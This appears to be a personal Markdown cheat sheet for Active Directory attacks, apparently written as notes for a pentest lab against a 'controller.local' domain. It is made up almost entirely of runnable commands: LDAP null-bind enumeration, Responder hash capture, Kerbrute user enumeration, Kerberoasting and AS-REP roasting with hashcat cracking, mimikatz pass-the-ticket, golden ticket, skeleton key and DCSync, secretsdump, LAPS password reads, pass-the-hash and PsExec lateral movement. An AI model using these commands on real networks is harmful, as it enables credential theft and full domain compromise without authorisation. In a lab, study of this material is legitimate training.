# Top Keys #
  1. Make sure you have added the domain to your /etc/hosts file
  2. You can search the hash using hashcat https://hashcat.net/wiki/doku.php?id=example_hashes 
  3. grep -i (ignore case helpful when searching output for password or hashes)

# Useful #
1. Get active logged on users
	a. Get-NetLoggedon -ComputerName clientXYZ
2. In 2.05 remember it looks up service principal name and you find iis and hostname for a webserver. 

# LDAP #
1. Basic Search
 
  a. ldapsearch -h $ip -p 389 -x -s base
  
2. Null creds to try and get list of usernames

  a. ldapsearch -x -h $ip -D '' -w '' -b "DC=controller,DC=local"
  
  b. Can clean up output with grep also search for passwords! Remember grep case sensistive grep -i (ignore case)
  

# Responder #
1. Start up responder

  a. sudo responder -I tun0
  
  b. Call request either smb or website (download a file from your python server)
  
  c. Capture the NTLM hash you get

# Kerberute #
  1. Enumerate Users from Kali
  
     a ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 
 # Rubeus #
  1. Harvest ticket caches
  
    a Rubeus.exe harvest /interval:30
   
  2. Brute force Password1 against all users
  
    a Rubeus.exe brute /password:Password1 /noticket
    
  3. Kerberoast -dump hashes of any kerberoastable users
  
    a Rubeus.exe kerberoast
   
    b Copy hash to hash.txr watch out for spaces
    
    c hashcat -m 13100 -a 0 hash.txt rockyou.txt
    
    
# ASREP Roasting # 
  1. Rubeus 
  
    a. rubeus.exe asreproast
    
    b Get all accounts that do not require pre authentication
    
    c Insert 23$ after $krb5asrep$ so for proper hash formating
    
    d hashcat -m 18200 hash.txt rockyou.txt
    
  2. Impacket GetNPUsers.py
  
    a. sudo python3 /opt/impacket/GetNPUsers.py CONTROLLER.local/ -usersfile users.txt -format hashcat
    
    b.  hashcat -m 18200 hash.txt rockyou.txt
 
 # mimikatz #
 1. ALWAYS RUN AS ADMIN
 2. Pass the Ticket
    a privilege::debug
   
    b sekurlsa::tickets /export (this will export all the tickets into your current directory)
    
    c Choose a ticket with admin (or user you want)
    
    d kerberos::ptt <ticket file name>
	
    e exit mimi
	
    f klist (show that you have now changed)
	
 3. Gold and Silver Tickets
    a run as admin
	
    b privilege::debug
	
    c lsadump::lsa /inject /name:krbtgt (this will dump the hash and security identifier krbtgt can be changed to other account names like sqlservice  or bob)
	
    d Gold ticket ->
	i. Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
	
 4. Mimikatz skeleton
	
		a. run as admin
	
		b. privilege::debug
	
		c. misc::skeleton
	
		d. Exit and you can read shares with default creds mimikatz
			The default credentials will be: "mimikatz"			
			example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password			
      example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1!

	
5. Mimikatz Domain Controller Synchronization
	
	a. lsadump::dcsync /user:Administrator
	You will get the NTLM hash
	
	
	# Secrets Dump #
1. Impacket Secrets Dump if you have creds of admin or backup account
	
  a. sudo python3 /opt/impacket/examples/secretsdump.py controller.local/admin:password@controller.local
	
  b. You will get the NTLM hashes 
  
 #Remote In #
  1. evil-winrm -i $ip -u user -p password
  
 # Priv Esc #
 1. If LAPS is in program files
	
    a. ldapsearch -x -h $ip -D user@controller.local -w password -b "DC=controller,DC=local"  "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
	
    b. Powershell schedule task to run rev shell with admin priv?

  # Lateral Movements #

 1. Pass the Hash - You have NTLM creds
	On Kali -> pth-winexe -U bob%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
eb3b9f05c425e //$ip cmd

2. Over Pass the Hash
	a. Right click a program like notepad and "run as different user"
	
	b. After authneticated that users NTLM hash has now been stored
	
	c. run mimikatz with admin priv 
	
	d. sekurlsa::pth /user:bob /domain:controller.local /ntlm:e2b475c11da2a0748290d
87aa966c327 /run:Powershell.exe
	
	e. net use //dc3  (generate TGT)
	
	f. .\PsExec.exe \\dc3 cmd.exe  (you are now on the dc machine)

	
DCOM
	
	

